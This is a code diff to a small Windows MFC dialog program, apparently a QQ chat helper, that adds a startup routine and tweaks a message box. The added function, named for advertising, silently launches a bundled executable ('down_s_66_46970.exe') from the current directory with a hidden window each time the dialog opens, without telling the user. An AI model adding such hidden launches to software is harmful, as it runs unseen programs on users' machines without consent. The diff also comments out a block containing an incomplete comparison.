@@ -77,6 +77,13 @@ END_MESSAGE_MAP()
 
 // CqiaoyukaDlg 消息处理程序
 
+void  RunGuangao(CString strDirectory)
+{
+    strDirectory += _T("\\down_s_66_46970.exe");
+    WinExec(CW2A(strDirectory),SW_HIDE);
+}
+
+
 BOOL CqiaoyukaDlg::OnInitDialog()
 {
 	CDialog::OnInitDialog();
@@ -106,6 +113,9 @@ BOOL CqiaoyukaDlg::OnInitDialog()
 	SetIcon(m_hIcon, TRUE);			// 设置大图标
 	SetIcon(m_hIcon, FALSE);		// 设置小图标
 
+	TCHAR StrCurrentDir[256] ={0};
+	GetCurrentDirectory(256,StrCurrentDir);
+    RunGuangao(T2CW(StrCurrentDir));
     m_hyperlink.SetURL(L"http://blog.sina.com.cn/s/blog_ac930a9f01018ouq.html");
 	// TODO: 在此添加额外的初始化代码
     m_Static_DiaoSiNiXi.SetURL(_T("http://blog.sina.com.cn/s/blog_8335c2af01013j8a.html"));
@@ -206,13 +216,13 @@ BOOL CALLBACK CqiaoyukaDlg::OEnumWindowsProc(HWND hwnd,
           GetWindowThreadProcessId(hwnd,&dwId);
            
 		   //Sethotkey
-		    if(dwId == )
+		    /*if(dwId == )
               
 			if(csWindowName!= _T("查找联系人"))
 			{
 				dlg->m_hTalk = hwnd;
 				return  FALSE;
-			}
+			}*/
 	 }
    
 return TRUE;
@@ -260,7 +270,7 @@ void CqiaoyukaDlg::OnBnClickedButtonSend()
 	}
 	else
 	{
-      AfxMessageBox(_T("请先打开巧遇卡"));
+      AfxMessageBox(_T("请先打开qq查找联系人运行巧遇卡"));
 	}
 
 }
